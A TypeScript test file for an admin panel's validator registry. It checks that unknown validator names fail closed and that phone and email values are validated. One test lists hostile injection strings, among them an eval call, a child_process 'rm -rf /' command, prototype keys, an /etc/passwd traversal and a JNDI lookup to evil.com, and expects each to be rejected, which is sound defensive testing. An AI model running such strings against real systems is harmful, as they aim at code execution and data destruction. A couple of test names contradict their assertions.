/**
 * HEAVIX — CP-02.17-IR-01 Phase A §04: Validator Resolution Contract Tests
 * PROVENANCE: RE-AUTHORED during CP-02.17-SCP-REC-01 recovery (×2 — lost twice to container restarts).
 * NOT original historical evidence.
 */

import { describe, it, expect, beforeAll } from 'vitest';
import { validateResourcePayload } from '@/lib/admin/resource-validator';
import { resolveValidator, hasValidator, listValidators, registerValidator } from '@/lib/admin/validator-registry';
import type { AdminResourceConfig } from '@/lib/admin/types';

const testConfig: AdminResourceConfig = {
  key: 'test-validator', titleFa: 'تست', titleEn: 'Test', icon: 'TestTube',
  model: 'testModel', apiBase: '/api/admin/resources/test-validator', adminPath: '/admin/resources/test-validator',
  permissions: { read: 'test.read', create: 'test.create', update: 'test.update', delete: 'test.delete', export: 'test.export' },
  columns: [{ key: 'phone', label: 'Phone', type: 'text' }, { key: 'email', label: 'Email', type: 'text' }],
  fields: [
    { key: 'phone', label: 'Phone', type: 'text', validation: { validator: 'phoneNumber' } },
    { key: 'email', label: 'Email', type: 'text', validation: { validator: 'email' } },
    { key: 'unknown', label: 'Unknown', type: 'text', validation: { validator: 'nonExistentValidator' } },
  ],
  detailTabs: [], actions: [], bulkActions: [], audit: { enabled: false, entityType: 'Test', actions: {} },
};

describe('CP-02.17-IR-01 §04 — Validator Registry', () => {
  beforeAll(() => {
    registerValidator('testAlwaysValid', () => null);
    registerValidator('testAlwaysInvalid', () => 'همیشه نامعتبر');
  });

  it('built-in validators are registered', () => {
    expect(hasValidator('phoneNumber')).toBe(true);
    expect(hasValidator('email')).toBe(true);
    expect(hasValidator('url')).toBe(true);
    expect(hasValidator('slug')).toBe(true);
    expect(hasValidator('nonEmpty')).toBe(true);
  });

  it('resolveValidator returns function for registered name', () => {
    const fn = resolveValidator('phoneNumber');
    expect(fn).not.toBeNull();
    expect(typeof fn).toBe('function');
  });

  it('resolveValidator returns null for unregistered name', () => {
    expect(resolveValidator('nonExistentValidator12345')).toBeNull();
  });

  it('resolveValidator does NOT use eval or dynamic import', () => {
    const maliciousNames = ['eval("alert(1)")', 'require("child_process").exec("rm -rf /")', 'constructor.constructor("return process")()', '__proto__', 'toString', 'valueOf', 'constructor', '../../../etc/passwd', '${jndi:ldap://evil.com}'];
    for (const name of maliciousNames) { expect(resolveValidator(name)).toBeNull(); }
  });

  it('listValidators returns sorted list', () => {
    const names = listValidators();
    expect(names).toContain('phoneNumber');
    expect(names).toContain('email');
    const sorted = [...names].sort();
    expect(names).toEqual(sorted);
  });
});

describe('CP-02.17-IR-01 §04 — Validator Resolution in validateResourcePayload', () => {
  it('valid input with registered validator passes', () => {
    const result = validateResourcePayload(testConfig, { phone: '09123456789', email: 'test@example.com', unknown: 'some value' });
    expect(result.ok).toBe(false);
    expect(result.errors).toHaveLength(1);
    expect(result.errors[0].field).toBe('unknown');
    expect(result.errors[0].code).toBe('custom');
  });

  it('unknown validator name fails closed', () => {
    const result = validateResourcePayload(testConfig, { phone: '09123456789', email: 'test@example.com', unknown: 'value' });
    expect(result.ok).toBe(false);
    const unknownError = result.errors.find(e => e.field === 'unknown');
    expect(unknownError).toBeDefined();
    expect(unknownError!.code).toBe('custom');
    expect(unknownError!.message).toContain('ناشناخته');
  });

  it('registered validator with invalid value produces error', () => {
    const result = validateResourcePayload(testConfig, { phone: 'invalid-phone', email: 'test@example.com' });
    expect(result.ok).toBe(false);
    const phoneError = result.errors.find(e => e.field === 'phone');
    expect(phoneError).toBeDefined();
    expect(phoneError!.message).toContain('موبایل');
  });

  it('registered validator with valid value passes', () => {
    const result = validateResourcePayload(testConfig, { phone: '09123456789', email: 'test@example.com' });
    expect(result.ok).toBe(true);
  });

  it('validator only runs when field is present in payload', () => {
    const result = validateResourcePayload(testConfig, { phone: '09123456789', email: 'test@example.com' });
    expect(result.ok).toBe(true);
  });

  it('malicious validator name fails closed (no code execution)', () => {
    const config: AdminResourceConfig = { ...testConfig, fields: [{ key: 'malicious', label: 'Malicious', type: 'text', validation: { validator: 'eval("alert(1)")' } }] };
    const result = validateResourcePayload(config, { malicious: 'some value' });
    expect(result.ok).toBe(false);
    expect(result.errors[0].code).toBe('custom');
    expect(result.errors[0].message).toContain('ناشناخته');
  });

  it('validation failure preserves frozen 422 contract', () => {
    const result = validateResourcePayload(testConfig, { phone: 'bad', email: 'bad', unknown: 'bad' });
    expect(result.ok).toBe(false);
    expect(result.errors).toBeInstanceOf(Array);
    expect(result.errors.length).toBeGreaterThan(0);
    for (const err of result.errors) { expect(err).toHaveProperty('field'); expect(err).toHaveProperty('message'); expect(err).toHaveProperty('code'); expect(err.code).toBe('custom'); }
  });

  it('email validator rejects malformed email', () => {
    const result = validateResourcePayload(testConfig, { phone: '09123456789', email: 'not-an-email' });
    expect(result.ok).toBe(false);
    const emailError = result.errors.find(e => e.field === 'email');
    expect(emailError).toBeDefined();
    expect(emailError!.message).toContain('ایمیل');
  });

  it('email validator accepts valid email', () => {
    const result = validateResourcePayload(testConfig, { phone: '09123456789', email: 'user@example.com' });
    expect(result.ok).toBe(true);
  });

  it('custom registered validator works (testAlwaysValid)', () => {
    const config: AdminResourceConfig = { ...testConfig, fields: [{ key: 'testField', label: 'Test', type: 'text', validation: { validator: 'testAlwaysValid' } }] };
    expect(validateResourcePayload(config, { testField: 'anything' }).ok).toBe(true);
  });

  it('custom registered validator works (testAlwaysInvalid)', () => {
    const config: AdminResourceConfig = { ...testConfig, fields: [{ key: 'testField', label: 'Test', type: 'text', validation: { validator: 'testAlwaysInvalid' } }] };
    const result = validateResourcePayload(config, { testField: 'anything' });
    expect(result.ok).toBe(false);
    expect(result.errors[0].message).toBe('همیشه نامعتبر');
  });
});
